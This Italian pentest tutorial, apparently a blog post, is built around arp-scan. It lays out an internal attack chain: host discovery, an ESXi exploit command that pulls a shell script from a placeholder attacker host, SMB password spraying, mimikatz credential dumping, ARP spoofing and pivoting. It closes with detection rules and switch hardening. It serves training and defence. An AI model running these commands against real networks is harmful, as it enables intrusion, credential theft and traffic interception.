---
title: >-
  ARP-Scan Exploitation per Pivoting Interno: Host Discovery, Lateral Movement e
  AD Compromise
slug: arp-scan
description: >-
  Arp-scan è il tool ideale per identificare dispositivi attivi nella rete LAN.
  Usato in fase di ricognizione, bypassa firewall e filtri ICMP per scoprire
  target nascosti.
image: /arpscan.webp
draft: false
date: 2026-01-26T00:00:00.000Z
categories:
  - tools
subcategories:
  - recon
tags:
  - arp-scan
---

# ARP-Scan Exploitation per Internal Pentest: Host Discovery, Lateral Movement e AD Compromise

Hai ottenuto un foothold su una workstation interna dopo un phishing campaign. L'ICMP è filtrato dai firewall locali e hai bisogno di mappare rapidamente il broadcast domain per identificare target critici. ARP-scan diventa il tuo strumento principale per il reconnaissance silenzioso in ambienti segmentati.

## TL;DR Operativo (Flusso a Step)

1. **Foothold & Initial Enumeration:** Dopo l'accesso iniziale, identifica le interfacce di rete e le subnet disponibili.
2. **Broadcast Domain Mapping:** Utilizza ARP-scan per enumerare tutti gli host vivi nel segmento L2, bypassando i filtri ICMP.
3. **Target Profiling & Prioritization:** Analizza gli indirizzi MAC e i vendor OUI per identificare server, workstation critiche e dispositivi di rete.
4. **Service Enumeration & Exploitation:** Scansiona i servizi sui target prioritari e sfrutta vulnerabilità specifiche per ottenere accesso.
5. **Credential Harvesting & Pivot:** Estrai credenziali e utilizza il riuso delle password per muoverti lateralmente verso altri segmenti.
6. **Active Directory Compromise:** Sfrutta la posizione privilegiata per attaccare i controller di dominio e ottenere il dominio completo.

***

## Fase 1: Ricognizione & Enumeration

**Scenario:** Sei su una workstation Windows 10 comprocessata con privilegi limitati. Devi comprendere l'ambiente di rete senza generare alert ICMP.

**Identificazione del Contesto di Rete:**

```bash
# Linux/Windows (con shell)
ipconfig /all          # Windows
ifconfig               # Linux
ip addr show           # Linux moderno

# Identifica le route e le subnet accessibili
route print            # Windows
ip route show          # Linux
```

**Scansione ARP del Broadcast Domain:**

```bash
# Scansione base del segmento locale
sudo arp-scan --interface eth0 --localnet

# Scansione di subnet specifiche (multivendor environment)
sudo arp-scan --interface eth0 192.168.1.0/24 10.10.10.0/24 172.16.0.0/24

# Output pulito per automazione
sudo arp-scan --interface eth0 --localnet -x | cut -f1 > live_hosts.txt
```

**Fingerprinting Avanzato via OUI:**

```bash
# Identifica dispositivi critici per vendor
sudo arp-scan --interface eth0 --localnet | tee full_scan.txt
grep -i "cisco" full_scan.txt      # Switch, router
grep -i "vmware" full_scan.txt     # Server virtuali
grep -i "dell" full_scan.txt       # Server fisici
grep -i "hp" full_scan.txt         # Stampanti, server
```

***

## Fase 2: Initial Exploitation

**Prioritizzazione dei Target Basata su Profiling:**

1. **Gateway (.1/.254):** Punto di ingresso per il pivot verso altri segmenti
2. **Server (.10/.100/.200):** Obiettivi ad alto valore con dati sensibili
3. **Infrastructure Devices:** DNS, DHCP, NTP - spesso trascurati nel patching
4. **Management Interfaces:** iDRAC, iLO, IPMI - credenziali di default comuni

**Service Enumeration Mirata:**

```bash
# Scansione rapida dei servizi sui target prioritari
nmap -p 22,23,80,443,445,3389,5985,5986 -iL high_value_targets.txt --open -oG services_scan.gnmap

# Identificazione delle versioni dei servizi
nmap -sV -p 445,5985,5986 -iL windows_hosts.txt
```

**Attack Chain Realistico: VMware ESXi Compromise**

1. Identificato MAC address con OUI VMware
2. Scansione porta 443/tcp (vSphere Web Client)
3. Versione rilevata: ESXi 6.7 senza patch
4. Exploit CVE-2021-21974 per RCE

```bash
# Scansione del target VMware
nmap -p 443 --script vmware-version 10.10.10.50

# Exploit dell'ESXi
python3 esxi_rce.py -t 10.10.10.50 -c "wget http://attacker.com/shell.sh -O /tmp/shell.sh"
```

**Credential Spraying Mirato:**

```bash
# Utilizza ARP-scan per identificare host Windows via OUI
sudo arp-scan --interface eth0 --localnet | grep "Microsoft" | cut -f1 > windows_hosts.txt

# Password spraying su SMB
crackmapexec smb windows_hosts.txt -u 'Administrator' -p 'Company2023!' --continue-on-success
```

***

## Fase 3: Post-Compromise & Network Situational Awareness

**Analisi Avanzata della Topologia di Rete:**

```bash
# Mappa le connessioni attive dagli host compromessi
netstat -an | findstr ESTABLISHED    # Windows
ss -tpn | grep ESTAB                 # Linux

# Analisi delle route interne per identificare subnet secondarie
route print | findstr /v "0.0.0.0"   # Windows
ip route | grep -v "default"         # Linux
```

**ARP Cache Analysis per Trust Relationships:**

```bash
# Analisi della cache ARP per identificare comunicazioni frequenti
arp -a | findstr dynamic             # Windows
ip neigh show                        # Linux

# Cerca host che comunicano regolarmente tra loro
# (potenziali trust relationships da sfruttare)
```

**Credential Harvesting Strategico:**

```bash
# Estrazione credenziali da memoria (Windows)
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Ricerca file di configurazione con password (Linux/Windows)
find / -name "*.config" -o -name "*.xml" -o -name "*pass*" -type f 2>/dev/null
dir /s *pass* *cred* *config*        # Windows
```

**SMB Abuse & Kerberos Targeting:**

```bash
# Enumera le share SMB disponibili
smbclient -L 10.10.10.100 -N

# Tenta di montare share interessanti
mount -t cifs //10.10.10.100/IT_Share /mnt/share -o user=guest
```

***

## Fase 4: Lateral Movement & Strategic Pivoting

**Considerazioni Strategiche per ARP Spoofing:**

* **Quando Usarlo:** In segmenti poco monitorati, per intercettare traffico verso target specifici
* **Quando Evitarlo:** In ambienti con detection avanzata, NAC, o segmenti critici
* **Impatto Operativo:** Genera rumore ma può fornire credenziali in chiaro

**Pivoting tra Broadcast Domains:**

```bash
# Identifica host multi-homed (connessi a più subnet)
ipconfig /all | findstr "IPv4"       # Windows
ip addr show | grep inet             # Linux

# Utilizza host compromessi come pivot
ssh -D 1080 -C -N user@compromised-host

# Scansione della rete interna attraverso il pivot
proxychains nmap -sT -p 445 172.16.100.0/24
```

**ARP Spoofing per Intercettazione Mirata:**

```bash
# Intercetta solo il traffico verso il gateway
arpspoof -i eth0 -t 192.168.1.50 192.168.1.1

# Monitora il traffico intercettato per credenziali
tcpdump -i eth0 -A port 80 or port 21 or port 23
```

**VLAN Hopping Considerations:**

* ARP-scan funziona solo all'interno della VLAN corrente
* Per attraversare VLAN serve accesso a trunk port o VLAN hopping exploit
* In ambienti enterprise, il movimento tra VLAN richiede compromissione del networking equipment

***

## Fase 5: Detection & Enterprise Hardening

**Indicatori di Compromissione Avanzati:**

**Log di Switch Enterprise (Cisco IOS):**

```bash
# ARP Storm Detection logs
%SW_DAI-4-DHCP_SNOOPING_DENY: 1 Invalid ARPs (Req) on Gi1/0/1

# Port Security Violation
%PM-4-ERR_DISABLE: psecure-violation error detected on Gi1/0/2
```

**Configurazione IDS/IPS per ARP Anomalies:**

```yaml
# Suricata rule per ARP scanning
alert arp any any -> any any (msg:"ARP Scan Detected"; arp.opcode == 1; threshold: type threshold, track by_src, count 100, seconds 10; sid:2023001; rev:1;)

# ARP spoofing detection
alert arp any any -> any any (msg:"Possible ARP Spoofing"; arp.hw.len != 6 or arp.proto.len != 4 or arp.hw.type != 1 or arp.proto.type != 0x0800; sid:2023002; rev:1;)
```

**Hardening Enterprise-Grade:**

**Switch Configuration (Cisco):**

```bash
# Abilita DHCP Snooping e Dynamic ARP Inspection
ip dhcp snooping vlan 10,20,30
ip dhcp snooping
ip arp inspection vlan 10,20,30
ip arp inspection validate src-mac dst-mac ip

# Port Security
interface GigabitEthernet1/0/1
 switchport port-security maximum 3
 switchport port-security violation restrict
 switchport port-security aging time 10
```

**Endpoint Protection:**

```bash
# Windows: ARP cache protection
netsh interface ipv4 set interface "Ethernet" arpfilter=enabled

# Linux: arpwatch per monitoraggio ARP
apt install arpwatch
systemctl start arpwatch
```

***

## Limitazioni di ARP-Scan in Ambienti Enterprise

1. **Layer 2 Boundary:** ARP non attraversa router, limitando la visibilità alle subnet remote
2. **Detection Evidente:** Scan ARP aggressivi sono facilmente rilevabili da IDS/IPS moderni
3. **WiFi Isolation:** In ambienti WiFi enterprise con client isolation, ARP-scan non funziona
4. **NAC Aggressivo:** Network Access Control può bloccare porte quando rileva ARP scanning
5. **VLAN Segmentation:** In ambienti multi-VLAN, serve accesso a ciascuna VLAN separatamente

***

## Errori Comuni Che Vedo Negli Assessment Reali

1. **Flat Network Architecture:** Segmenti di rete non separati che permettono ARP scanning completo dell'infrastruttura
2. **Missing ARP Monitoring:** Nessun sistema di alerting per ARP storms o spoofing attempts
3. **Credential Reuse Across Segments:** Stesse credenziali amministrative utilizzate su VLAN diverse
4. **Lack of Port Security:** Switch senza port security che permettono MAC flooding attacks
5. **Insufficient Logging:** Nessun logging degli eventi ARP a livello di switch o endpoint
6. **Static ARP Entries Missing:** Dispositivi critici senza ARP static entries, vulnerabili a spoofing

***

## FAQ Tecniche

**ARP-scan funziona su VLAN diverse?**
No. ARP opera al layer 2 e non attraversa i confini delle VLAN senza routing appropriato o tecniche di VLAN hopping.

**ARP-scan è stealth?**
No. Genera traffico broadcast rilevabile da IDS e sistemi di monitoraggio della rete. La velocità può essere modulata ma resta rilevabile.

**Qual è la differenza tra arp-scan e nmap -PR?**
Entrambi utilizzano ARP per host discovery, ma nmap -PR è integrato in una suite più ampia di tecniche di scanning, mentre arp-scan è specializzato e spesso più veloce nel segmento L2.

***

## Tabella Comparativa: Host Discovery Methods

| Tecnica         | Layer | Stealth | Velocità | Affidabilità | Rilevamento |
| --------------- | ----- | ------- | -------- | ------------ | ----------- |
| ARP-scan        | L2    | Bassa   | Alta     | Alta         | Alta        |
| Nmap -sn (ICMP) | L3    | Media   | Media    | Media        | Media       |
| Nmap -PR (ARP)  | L2    | Bassa   | Alta     | Alta         | Alta        |
| TCP SYN Ping    | L4    | Alta    | Bassa    | Alta         | Bassa       |
| UDP Ping        | L4    | Alta    | Bassa    | Variabile    | Bassa       |

***

## Playbook Operativo 80/20: Internal Network Compromise

| Obiettivo                       | Azione Concreta                            | Comando/Tool Esempio                                       |
| ------------------------------- | ------------------------------------------ | ---------------------------------------------------------- |
| Mappatura broadcast domain      | Scansione ARP completa del segmento        | `sudo arp-scan --interface eth0 --localnet`                |
| Identificazione target critici  | Profiling via OUI e analisi pattern IP     | `grep -E "(VMware\|Cisco\|Microsoft)"`                     |
| Enumerazione servizi            | Scansione mirata su target prioritari      | `nmap -p 445,5985,3389 -iL windows_hosts.txt`              |
| Sfruttamento iniziale           | Credential spraying su servizi esposti     | `crackmapexec smb targets.txt -u userlist -p passlist`     |
| Pivot tra segmenti              | Utilizzo host compromessi come jump box    | `ssh -D 1080 -C -N user@pivot-host`                        |
| Compromissione Active Directory | Attacco Kerberos e movimento laterale AD   | `bloodhound-python -d domain.local -u user -p pass -c All` |
| Hardening detection             | Monitoraggio ARP anomalies e port security | Configurazione switch enterprise + IDS rules               |

***

## Lab Avanzato: Internal AD Pivot & Domain Compromise

**Scenario "EnterpriseBreach":** Replica un ambiente aziendale con Active Directory complesso, multi-VLAN e sistemi legacy.

**Fasi del Lab:**

1. **Initial Foothold:** Accesso a workstation via phishing simulato
2. **Network Reconnaissance:** Mappatura completa dei segmenti L2/L3 utilizzando tecniche combinate
3. **Privilege Escalation:** Sfruttamento vulnerabilità su server identifcati via fingerprinting
4. **Lateral Movement:** Pivot tra VLAN utilizzando credenziali raccolte e trust relationships
5. **Domain Dominance:** Compromissione completa dell'Active Directory attraverso attacchi Kerberos avanzati

**Cosa Imparerai:**

* Triage efficace degli host in ambienti enterprise complessi
* Tecniche di movimento laterale in reti segmentate
* Strategie per evitare detection durante l'host discovery
* Metodologie per la compromissione di Active Directory partendo da un accesso limitato

**Per team e aziende:** Offriamo percorsi formativi personalizzati e servizi di assessment per testare la resilienza della tua infrastruttura. **[Scopri i nostri servizi per enterprise](https://hackita.it/servizi)**

**Supporta il progetto** per mantenere accessibili contenuti tecnici di qualità: **[Supporta HackITA](https://hackita.it/supporta)**

***

## Riferimenti Tecnici Esterni

* [https://nmap.org/book/man-host-discovery.html](https://nmap.org/book/man-host-discovery.html)
* [https://linux.die.net/man/1/arp-scan](https://linux.die.net/man/1/arp-scan)
* [https://attack.mitre.org/techniques/T1046/](https://attack.mitre.org/techniques/T1046/)

*Questa guida è per scopi formativi in ambienti controllati e autorizzati. Ogni test su sistemi di terze parti richiede autorizzazione scritta esplicita.*
